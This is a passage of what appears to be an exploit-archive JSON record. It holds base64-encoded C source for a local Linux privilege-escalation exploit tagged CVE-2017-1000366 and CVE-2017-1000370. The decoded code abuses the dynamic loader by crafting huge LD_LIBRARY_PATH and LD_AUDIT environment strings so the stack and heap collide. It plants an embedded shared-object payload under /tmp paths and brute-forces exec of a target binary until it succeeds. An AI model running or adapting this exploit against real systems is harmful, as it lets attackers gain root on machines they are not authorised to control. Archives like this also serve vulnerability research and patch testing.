X2ltcG9ydGFudF9od2NhcHMoJmloYywgaW1wb3J0YW50X2h3Y2FwcyArIGlkeCkpIHsNCiAgICAgICAgICAgIGlmIChudW1faW1wb3J0YW50X2h3Y2FwcyA+PSBtYXhfaW1wb3J0YW50X2h3Y2Fwcykgew0KICAgICAgICAgICAgICAgIGlmIChudW1faW1wb3J0YW50X2h3Y2FwcyAhPSBtYXhfaW1wb3J0YW50X2h3Y2FwcykgZGllKCk7DQogICAgICAgICAgICAgICAgaWYgKG1heF9pbXBvcnRhbnRfaHdjYXBzID49IDY1NTM2KSBkaWUoKTsNCiAgICAgICAgICAgICAgICBtYXhfaW1wb3J0YW50X2h3Y2FwcyArPSAyNTY7DQoNCiAgICAgICAgICAgICAgICBpZiAobnVtX2ltcG9ydGFudF9od2NhcHMgPj0gbWF4X2ltcG9ydGFudF9od2NhcHMpIGRpZSgpOw0KICAgICAgICAgICAgICAgIGltcG9ydGFudF9od2NhcHMgPSByZWFsbG9jKGltcG9ydGFudF9od2NhcHMsIG1heF9pbXBvcnRhbnRfaHdjYXBzICogc2l6ZW9mKHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzKSk7DQogICAgICAgICAgICAgICAgaWYgKCFpbXBvcnRhbnRfaHdjYXBzKSBkaWUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIG1lbW1vdmUoaW1wb3J0YW50X2h3Y2FwcyArIGlkeCArIDEsIGltcG9ydGFudF9od2NhcHMgKyBpZHgsIChudW1faW1wb3J0YW50X2h3Y2FwcyAtIGlkeCkgKiBzaXplb2Yoc3RydWN0IG15X2ltcG9ydGFudF9od2NhcHMpKTsNCiAgICAgICAgICAgIGltcG9ydGFudF9od2NhcHNbaWR4XSA9IGloYzsNCiAgICAgICAgICAgIG51bV9pbXBvcnRhbnRfaHdjYXBzKys7DQogICAgICAgIH0NCiAgICB9IHdoaWxlICgrK2h3Y2FwX21hc2spOw0KICB9DQogICAgcHJpbnRmKCJudW1faW1wb3J0YW50X2h3Y2FwcyAlenVcbiIsIG51bV9pbXBvcnRhbnRfaHdjYXBzKTsNCg0KICAgIHN0YXRpYyBzdHJ1Y3Qgew0KICAgICAgICBkb3VibGUgcHJvYmFiaWxpdHk7DQogICAgICAgIHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzIGloYzsNCiAgICAgICAgc2l6ZV90IGd3ciwgZHN0LCBjbnQ7DQogICAgfSBiZXN0Ow0KDQogICAgI2RlZmluZSBMSUIgIi9saWIiDQogICAgI2RlZmluZSBTRVBfTElCICI6IiBMSUINCiAgICAjZGVmaW5lIExMUCAiTERfTElCUkFSWV9QQVRIPSINCiAgICBzdGF0aWMgY2hhciBsbHBbTUFYX0FSR19TVFJMRU5dOw0KICAgICNkZWZpbmUgTUFYX0dXUiAoKHNpemVvZihsbHApIC0gKHNpemVvZihMTFApLTEgKyBzaXplb2YoU0VQX0xJQiktMSArIDEpKSAmIH4oTUFMTE9DX0FMSUdOLTEpKQ0KICAgIHNpemVfdCBnd3I7DQogICAgZm9yIChnd3IgPSBNQVhfR1dSOyBnd3IgPj0gMTI4OyBnd3IgLT0gTUFMTE9DX0FMSUdOKSB7DQogICAgICAgIHNpemVfdCBkc3Q7DQogICAgICAgIGZvciAoZHN0ID0gMDsgZHN0IDwgc2l6ZW9mKERTVHMpL3NpemVvZigqRFNUcyk7IGRzdCsrKSB7DQogICAgICAgICAgICBjb25zdCBzaXplX3QgY250ID0gKE1BWF9HV1IgLSBnd3IpIC8gKDEgKyBEU1RzW2RzdF0ubGVuICsgMSk7DQogICAgICAgICAgICBjb25zdCBzaXplX3QgZ3BqID0gKHNpemVvZihTRVBfTElCKS0xICsgTUFYX0dXUiArIGNudCAqIChyZXBsX21heCAtICh0YXJnZXQtPmlnbm9yZV9saWIgPyA3IDogNCkpICsgMSArIFNUQUNLX0FMSUdOLTEpICYgfihTVEFDS19BTElHTi0xKTsNCiAgICAgICAgICAgIGNvbnN0IHNpemVfdCBid3IgPSAoc2l6ZW9mKFNFUF9MSUIpLTEgKyBjbnQgKiAoRFNUc1tkc3RdLnJlcGxfbGVuICsgMSkpICsgKChNQVhfR1dSIC0gZ3dyKSAtIGNudCAqICgxICsgRFNUc1tkc3RdLmxlbiArIDEpKSArIDE7DQoNCiAgICAgICAgICAgIGNvbnN0IHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzIGtleSA9IHsgLnN0cmluZ3MgPSBnd3IgKyBid3IgfTsNCiAgICAgICAgICAgIGlmIChrZXkucG9pbnRlcnMpIGRpZSgpOw0KDQogICAgICAgICAgICBzaXplX3QgaWR4ID0gbXlfYnNlYXJjaCgma2V5LCBpbXBvcnRhbnRfaHdjYXBzLCBudW1faW1wb3J0YW50X2h3Y2Fwcywgc2l6ZW9mKHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzKSwgY21wX2ltcG9ydGFudF9od2NhcHMpOw0KICAgICAgICAgICAgZm9yICg7IGlkeCA8IG51bV9pbXBvcnRhbnRfaHdjYXBzOyBpZHgrKykgew0KICAgICAgICAgICAgICAgIGNvbnN0IHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzIGloYyA9IGltcG9ydGFudF9od2NhcHNbaWR4XTsNCiAgICAgICAgICAgICAgICBpZiAoaWhjLnN0cmluZ3MgPCBnd3IgKyBid3IpIGRpZSgpOw0KICAgICAgICAgICAgICAgIGlmIChpaGMubWF4X2NhcHN0cmxlbiAlIE1BTExPQ19BTElHTiA+PSBzaXplb2YoIi8uLiIpKSBjb250aW51ZTsNCiAgICAgICAgICAgICAgICBpZiAoaWhjLnNlYXJjaF9kaXJzXzAgPj0gU1RBQ0tfUkFORCkgY29udGludWU7DQoNCiAgICAgICAgICAgICAgICBjb25zdCBzaXplX3QgbWluID0gTUlOKGd3ciwgaWhjLnBvaW50ZXJzKTsNCiAgICAgICAgICAgICAgICBpZiAoZ3BqIDwgbWluICsgaWhjLnN0cmluZ3MgKyBpaGMuc2VhcmNoX2RpcnMgKyAyICogdGFyZ2V0LT5tZW1hbGlnbl91cCArIDIgKiBQQUdFU1ogKyAodGFyZ2V0LT5pZ25vcmVfb3JpZ2luID8gMCA6IFBBVEhfTUFYKSkgY29udGludWU7DQoNCiAgICAgICAgICAgICAgICBjb25zdCBkb3VibGUgcHJvYmFiaWxpdHkgPQ0KICAgICAgICAgICAgICAgICAgICAoZG91YmxlKSgodWludDY0X3QpKFNUQUNLX1JBTkQgLSBpaGMuc2VhcmNoX2RpcnNfMCkgKiAodWludDY0X3QpbWluKSAvDQogICAgICAgICAgICAgICAgICAgIChkb3VibGUpKCh1aW50NjRfdClTVEFDS19SQU5EICogKHVpbnQ2NF90KShNTUFQX1JBTkQgKyAoU1RBQ0tfUkFORCAtIGloYy5zZWFyY2hfZGlyc18wKSkpOw0KICAgICAgICAgICAgICAgIGlmIChiZXN0LnByb2JhYmlsaXR5IDwgcHJvYmFiaWxpdHkpIHsNCiAgICAgICAgICAgICAgICAgICAgYmVzdC5wcm9iYWJpbGl0eSA9IHByb2JhYmlsaXR5Ow0KICAgICAgICAgICAgICAgICAgICBiZXN0LmloYyA9IGloYzsNCiAgICAgICAgICAgICAgICAgICAgYmVzdC5nd3IgPSBnd3I7DQogICAgICAgICAgICAgICAgICAgIGJlc3QuZHN0ID0gZHN0Ow0KICAgICAgICAgICAgICAgICAgICBiZXN0LmNudCA9IGNudDsNCiAgICAgICAgICAgICAgICAgICAgcHJpbnRmKCJsZW4gJXp1IGloY3AgJXp1IGloY3MgJXp1IHNkICV6dSBzZDAgJXp1IGdwaiAlenUgZ3dyICV6dSBid3IgJXp1IGNudCAlenUgZHN0ICV6dSByZXBsICV6dSBwcm9iYWJpbGl0eSAxLyV6dSAoJS4xMGcpIG1hc2sgJWx4XG4iLA0KICAgICAgICAgICAgICAgICAgICAgICAgaWhjLm1heF9jYXBzdHJsZW4sIGloYy5wb2ludGVycywgaWhjLnN0cmluZ3MsIGloYy5zZWFyY2hfZGlycywgaWhjLnNlYXJjaF9kaXJzXzAsIGdwaiwgZ3dyLCBid3IsIGNudCwgRFNUc1tkc3RdLmxlbiwgRFNUc1tkc3RdLnJlcGxfbGVuLA0KICAgICAgICAgICAgICAgICAgICAgICAgKHNpemVfdCkoMSAvIHByb2JhYmlsaXR5KSwgcHJvYmFiaWxpdHksIGloYy5od2NhcF9tYXNrKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKCFiZXN0LnByb2JhYmlsaXR5KSBkaWUoKTsNCiAgICBpZiAoU1RBQ0tfQkFTRSA8PSBNTUFQX0JBU0UpIGRpZSgpOw0KICAgIGNvbnN0IHNpemVfdCBtbWFwX3NpemUgPSAoKFNUQUNLX0JBU0UgLSBNTUFQX0JBU0UpIC8gMikgLSBNTUFQX1JBTkQgLyAyDQogICAgICAgIC0gKGdldF9lbGZfbW1hcHMoYmluYXJ5KSArIGdldF9lbGZfbW1hcHMoIi9saWIvbGQtbGludXguc28uMiIpICsgYmVzdC5paGMucG9pbnRlcnMgKyBiZXN0LmloYy5zdHJpbmdzICsgYmVzdC5paGMuc2VhcmNoX2RpcnMpOw0KICAgIGNvbnN0IHNpemVfdCBzdGFja19zaXplID0gKChTVEFDS19CQVNFIC0gTU1BUF9CQVNFKSAvIDIpIC0gKChTVEFDS19SQU5EICsgYmVzdC5paGMuc2VhcmNoX2RpcnNfMCkgLyAyKTsNCiAgICBwcmludGYoIm1tYXBfc2l6ZSAlenUgc3RhY2tfc2l6ZSAlenVcbiIsIG1tYXBfc2l6ZSwgc3RhY2tfc2l6ZSk7DQoNCiAgICAjZGVmaW5lIFJFTF9MQSAiYSINCiAgICAjZGVmaW5lIExEQSAiTERfQVVESVQ9Ig0KICAgIHN0YXRpYyBjaGFyIGxkYVtNQVhfQVJHX1NUUkxFTl07DQogICAgI2RlZmluZSBNQVhfUkxEQVMgKChzaXplb2YobGRhKSAtIHNpemVvZihMREEpKSAvIHNpemVvZihSRUxfTEEpKQ0KICAgIGlmIChzaXplb2Yoc3RydWN0IGF1ZGl0X2xpc3QpICUgTUFMTE9DX0FMSUdOKSBkaWUoKTsNCiAgICBjb25zdCBzaXplX3QgbGRhcyA9IChtbWFwX3NpemUgLyBzaXplb2Yoc3RydWN0IGF1ZGl0X2xpc3QpKSAvIE1BWF9STERBUzsNCiAgICBpZiAobGRhcyA+PSBNQVhfQVJHX1NUUklOR1MgLyAzKSBkaWUoKTsNCg0KICAgICNkZWZpbmUgSU5JVElBTF9TVEFDS19FWFBBTlNJT04gKDEzMTA3MlVMKQ0KICAgIGNvbnN0IHNpemVfdCBwYWRzID0gSU5JVElBTF9TVEFDS19FWFBBTlNJT04gLyBzaXplb2YoY2hhciAqKSAtIGxkYXM7DQogICAgaWYgKHBhZHMgPj0gSU5JVElBTF9TVEFDS19FWFBBTlNJT04gLyBzaXplb2YoY2hhciAqKSkgZGllKCk7DQogICAgaWYgKHBhZHMgPj0gTUFYX0FSR19TVFJJTkdTIC8gMykgZGllKCk7DQogICAgc3RhdGljIGNoYXIgcGFkW01BWF9BUkdfU1RSTEVOXTsNCiAgew0KICAgIGNvbnN0IHNpemVfdCBwYWRsID0gKHN0YWNrX3NpemUgLSBzaXplb2YobGxwKSAtIGxkYXMgKiAoc2l6ZW9mKGxkYSkgKyBzaXplb2YoY2hhciAqKSkgLSBwYWRzICogc2l6ZW9mKGNoYXIgKikpIC8gcGFkczsNCiAgICBpZiAocGFkbCA+PSBzaXplb2YocGFkKSkgZGllKCk7DQogICAgaWYgKHBhZGwgPD0gMCkgZGllKCk7DQogICAgbWVtc2V0KHBhZCwgJyAnLCBwYWRsLTEpOw0KICAgIHByaW50ZigibGRhcyAlenUgcGFkcyAlenUgcGFkbCAlenVcbiIsIGxkYXMsIHBhZHMsIHBhZGwpOw0KICB9DQoNCiAgew0KICAgIGNoYXIgKiBjcCA9IG1lbXBjcHkobGxwLCBMTFAsIHNpemVvZihMTFApLTEpOw0KICAgIG1lbXNldChjcCwgJy8nLCBNQVhfR1dSKTsNCiAgICBtZW1jcHkoY3AgKyBNQVhfR1dSLCBTRVBfTElCLCBzaXplb2YoU0VQX0xJQiktMSk7DQogICAgaWYgKCooY3AgKyBNQVhfR1dSICsgc2l6ZW9mKFNFUF9MSUIpLTEpKSBkaWUoKTsNCg0KICAgICNkZWZpbmUgTElCX1RPX1RNUCAiLy4uL3RtcC8iDQogICAgaWYgKHNpemVvZihMSUJfVE9fVE1QKS0xICE9IE1BTExPQ19BTElHTikgZGllKCk7DQoNCiAgICBpZiAoIWJlc3QuZ3dyKSBkaWUoKTsNCiAgICBpZiAoYmVzdC5nd3IgPj0gTUFYX0dXUikgZGllKCk7DQogICAgaWYgKGJlc3QuZ3dyICUgTUFMTE9DX0FMSUdOKSBkaWUoKTsNCiAgICBzaXplX3QgaTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgYmVzdC5nd3IgLyBNQUxMT0NfQUxJR047IGkrKykgew0KICAgICAgICBjcCA9IG1lbXBjcHkoY3AsIExJQl9UT19UTVAsIE1BTExPQ19BTElHTik7DQogICAgfQ0KICAgIGlmICghYmVzdC5jbnQpIGRpZSgpOw0KICAgIGlmIChiZXN0LmRzdCA+PSBzaXplb2YoRFNUcykvc2l6ZW9mKCpEU1RzKSkgZGllKCk7DQogICAgZm9yIChpID0gMDsgaSA8IGJlc3QuY250OyBpKyspIHsNCiAgICAgICAgKmNwKysgPSAnJCc7DQogICAgICAgIGNwID0gbWVtcGNweShjcCwgRFNUc1tiZXN0LmRzdF0uc3RyLCBEU1RzW2Jlc3QuZHN0XS5sZW4pOw0KICAgICAgICAqY3ArKyA9ICcvJzsNCiAgICB9DQogICAgaWYgKGNwID49IGxscCArIHNpemVvZihsbHApKSBkaWUoKTsNCiAgICBpZiAobGxwW3NpemVvZihsbHApLTFdKSBkaWUoKTsNCiAgfQ0KDQogICAgI2RlZmluZSBMSENNICJMRF9IV0NBUF9NQVNLPSINCiAgICBzdGF0aWMgY2hhciBsaGNtWzY0XTsNCiAgICBpZiAoKHVuc2lnbmVkIGludClzbnByaW50ZihsaGNtLCBzaXplb2YobGhjbSksICIlcyVsdSIsIExIQ00sIGJlc3QuaWhjLmh3Y2FwX21hc2spDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPj0gc2l6ZW9mKGxoY20pKSBkaWUoKTsNCiAgew0KICAgIGNoYXIgKiBjcCA9IG1lbXBjcHkobGRhLCBMREEsIHNpemVvZihMREEpLTEpOw0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBNQVhfUkxEQVM7IGkrKykgew0KICAgICAgICBjcCA9IG1lbXBjcHkoY3AsIFJFTF9MQSAiOiIsIHNpemVvZihSRUxfTEEpKTsNCiAgICB9DQogICAgaWYgKGNwID49IGxkYSArIHNpemVvZihsZGEpKSBkaWUoKTsNCiAgICBpZiAoKmNwKSBkaWUoKTsNCiAgfQ0KICAgIHN0YXRpYyBjaGFyIHJsZGFbTUFYX0FSR19TVFJMRU5dOw0KDQogICAgY29uc3Qgc2l6ZV90IGFyZ3MgPSAxICsgcGFkcyArIDE7DQogICAgY2hhciAqKiBjb25zdCBhcmd2ID0gY2FsbG9jKGFyZ3MsIHNpemVvZihjaGFyICopKTsNCiAgICBpZiAoIWFyZ3YpIGRpZSgpOw0KICB7DQogICAgY2hhciAqKiBhcCA9IGFyZ3Y7DQogICAgKmFwKysgPSAoY2hhciAqKWJpbmFyeTsNCiAgICBzaXplX3QgaTsNCiAgICBmb3IgKGkgPSAwOyBpIDwgcGFkczsgaSsrKSB7DQogICAgICAgICphcCsrID0gcGFkOw0KICAgIH0NCiAgICAqYXArKyA9IE5VTEw7DQogICAgaWYgKGFwICE9IGFyZ3YgKyBhcmdzKSBkaWUoKTsNCiAgfQ0KDQogICAgY29uc3Qgc2l6ZV90IGVudnMgPSAyICsgbGRhcyArIDI7DQogICAgY2hhciAqKiBjb25zdCBlbnZwID0gY2FsbG9jKGVudnMsIHNpemVvZihjaGFyICopKTsNCiAgICBpZiAoIWVudnApIGRpZSgpOw0KICB7DQogICAgY2hhciAqKiBlcCA9IGVudnA7DQogICAgKmVwKysgPSBsbHA7DQogICAgKmVwKysgPSBsaGNtOw0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBsZGFzOyBpKyspIHsNCiAgICAgICAgKmVwKysgPSBsZGE7DQogICAgfQ0KICAgICplcCsrID0gcmxkYTsNCiAgICAqZXArKyA9IE5VTEw7DQogICAgaWYgKGVwICE9IGVudnAgKyBlbnZzKSBkaWUoKTsNCiAgfQ0KDQogIHsNCiAgICBzdGF0aWMgY29uc3Qgc3RydWN0IHJsaW1pdCBybGltaXRfc3RhY2sgPSB7IFJMSU1fSU5GSU5JVFksIFJMSU1fSU5GSU5JVFkgfTsNCiAgICBpZiAoc2V0cmxpbWl0KFJMSU1JVF9TVEFDSywgJnJsaW1pdF9zdGFjaykpIGRpZSgpOw0KICB9DQogICAgaW50IHBpcGVmZFsyXTsNCiAgICBpZiAocGlwZShwaXBlZmQpKSBkaWUoKTsNCiAgICBpZiAoY2xvc2UocGlwZWZkWzBdKSkgZGllKCk7DQogICAgcGlwZWZkWzBdID0gLTE7DQogICAgaWYgKHNpZ25hbChTSUdQSVBFLCBTSUdfREZMKSA9PSBTSUdfRVJSKSBkaWUoKTsNCg0KICB7DQogICAgI2RlZmluZSBBQlNfTEFfRElSICIvIiBMSUIgIi8iIExJQl9UT19UTVAgIi8iDQogICAgc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBhYnNfbGFzW10gPSB7DQogICAgICAgIEFCU19MQV9ESVIgIiIgUkVMX0xBLA0KICAgICAgICBBQlNfTEFfRElSICIvIiBSRUxfTEEsDQogICAgICAgIEFCU19MQV9ESVIgIi8uIiBSRUxfTEEsDQogICAgICAgIEFCU19MQV9ESVIgIi8uLiIgUkVMX0xBLA0KICAgIH07DQogICAgc2l6ZV90IGk7DQogICAgZm9yIChpID0gMDsgaSA8IHNpemVvZihhYnNfbGFzKS9zaXplb2YoKmFic19sYXMpOyBpKyspIHsNCiAgICAgICAgY29uc3QgaW50IGZkID0gb3BlbihhYnNfbGFzW2ldLCBPX1dST05MWSB8IE9fQ1JFQVQgfCBPX1RSVU5DIHwgT19OT0ZPTExPVywgMCk7DQogICAgICAgIGlmIChmZCA8PSAtMSkgZGllKCk7DQogICAgICB7DQogICAgICAgIHN0cnVjdCBzdGF0IHN0Ow0KICAgICAgICBpZiAoZnN0YXQoZmQsICZzdCkpIGRpZSgpOw0KICAgICAgICBpZiAoIVNfSVNSRUcoc3Quc3RfbW9kZSkpIGRpZSgpOw0KICAgICAgICBpZiAoc3Quc3RfdWlkICE9IGdldHVpZCgpKSBkaWUoKTsNCiAgICAgICAgaWYgKHN0LnN0X3VpZCAhPSBnZXRldWlkKCkpIGRpZSgpOw0KICAgICAgfQ0KICAgICAgew0KICAgICAgICBzdGF0aWMgY29uc3QNCiAgICAgICAgI2luY2x1ZGUgImxhLnNvLmgiDQogICAgICAgIGlmIChzaXplb2YobGFfc28pICE9IGxhX3NvX2xlbikgZGllKCk7DQogICAgICAgIGlmICh3cml0ZShmZCwgbGFfc28sIHNpemVvZihsYV9zbykpICE9IChzc2l6ZV90KXNpemVvZihsYV9zbykpIGRpZSgpOw0KICAgICAgfQ0KICAgICAgICBpZiAoZmNobW9kKGZkLCAwNDc1NSkpIGRpZSgpOw0KICAgICAgICBpZiAoY2xvc2UoZmQpKSBkaWUoKTsNCiAgICB9DQogIH0NCg0KICAgIHNpemVfdCB0cnk7DQogICAgZm9yICh0cnkgPSAxOyB0cnkgPD0gNjU1MzY7IHRyeSsrKSB7DQogICAgICB7DQogICAgICAgIGNoYXIgKiBjcCA9IG1lbXBjcHkocmxkYSwgTERBLCBzaXplb2YoTERBKS0xKTsNCiAgICAgICAgc2l6ZV90IHJsZGFzID0gMSArIHJhbmRvbSgpICUgKDY1NTM2IC8gc2l6ZW9mKHN0cnVjdCBhdWRpdF9saXN0KSk7DQogICAgICAgIGlmIChybGRhcyA+IE1BWF9STERBUykgZGllKCk7DQogICAgICAgIGlmIChybGRhcyA8PSAwKSBkaWUoKTsNCiAgICAgICAgd2hpbGUgKHJsZGFzLS0pIHsNCiAgICAgICAgICAgIGNwID0gbWVtcGNweShjcCwgUkVMX0xBICI6Iiwgc2l6ZW9mKFJFTF9MQSkpOw0KICAgICAgICB9DQogICAgICAgIGlmIChjcCA+PSBybGRhICsgc2l6ZW9mKHJsZGEpKSBkaWUoKTsNCiAgICAgICAgKmNwID0gJ1wwJzsNCiAgICAgIH0NCiAgICAgICAgaWYgKGZmbHVzaChzdGRvdXQpKSBkaWUoKTsNCiAgICAgICAgY29uc3QgcGlkX3QgcGlkID0gZm9yaygpOw0KICAgICAgICBpZiAocGlkIDw9IC0xKSBkaWUoKTsNCiAgICAgICAgaWYgKHBpZCA9PSAwKSB7DQogICAgICAgICAgICBpZiAoZHVwMihwaXBlZmRbMV0sIDEpICE9IDEpIGRpZSgpOw0KICAgICAgICAgICAgaWYgKGR1cDIocGlwZWZkWzFdLCAyKSAhPSAyKSBkaWUoKTsNCiAgICAgICAgICAgIGV4ZWN2ZSgqYXJndiwgYXJndiwgZW52cCk7DQogICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfQ0KICAgICAgICBpbnQgc3RhdHVzID0gMDsNCiAgICAgICAgc3RydWN0IHRpbWV2YWwgc3RhcnQsIHN0b3AsIGRpZmY7DQogICAgICAgIGlmIChnZXR0aW1lb2ZkYXkoJnN0YXJ0LCBOVUxMKSkgZGllKCk7DQogICAgICAgIGlmICh3YWl0cGlkKHBpZCwgJnN0YXR1cywgV1VOVFJBQ0VEKSAhPSBwaWQpIGRpZSgpOw0KICAgICAgICBpZiAoZ2V0dGltZW9mZGF5KCZzdG9wLCBOVUxMKSkgZGllKCk7DQogICAgICAgIHRpbWVyc3ViKCZzdG9wLCAmc3RhcnQsICZkaWZmKTsNCiAgICAgICAgcHJpbnRmKCJ0cnkgJXp1ICVsZC4lMDZsZCAiLCB0cnksIGRpZmYudHZfc2VjLCBkaWZmLnR2X3VzZWMpOw0KDQogICAgICAgIGlmIChXSUZTSUdOQUxFRChzdGF0dXMpKSB7DQogICAgICAgICAgICBwcmludGYoInNpZ25hbCAlZFxuIiwgV1RFUk1TSUcoc3RhdHVzKSk7DQogICAgICAgICAgICBzd2l0Y2ggKFdURVJNU0lHKHN0YXR1cykpIHsNCiAgICAgICAgICAgICAgICBjYXNlIFNJR1BJUEU6DQogICAgICAgICAgICAgICAgY2FzZSBTSUdTRUdWOg0KICAgICAgICAgICAgICAgIGNhc2UgU0lHQlVTOg0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIGlmIChXSUZFWElURUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgcHJpbnRmKCJleGl0ZWQgJWRcbiIsIFdFWElUU1RBVFVTKHN0YXR1cykpOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0gZWxzZSBpZiAoV0lGU1RPUFBFRChzdGF0dXMpKSB7DQogICAgICAgICAgICBwcmludGYoInN0b3BwZWQgJWRcbiIsIFdTVE9QU0lHKHN0YXR1cykpOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBwcmludGYoInVua25vd24gJWRcbiIsIHN0YXR1cyk7DQogICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBkaWUoKTsNCn0=", 
    "filename": "platforms/lin_x86/local/42274.c", 
    "id": "42274", 
    "cves": [
        "CVE-2017-1000366", 
        "CVE-2017-1000370"
    ]
}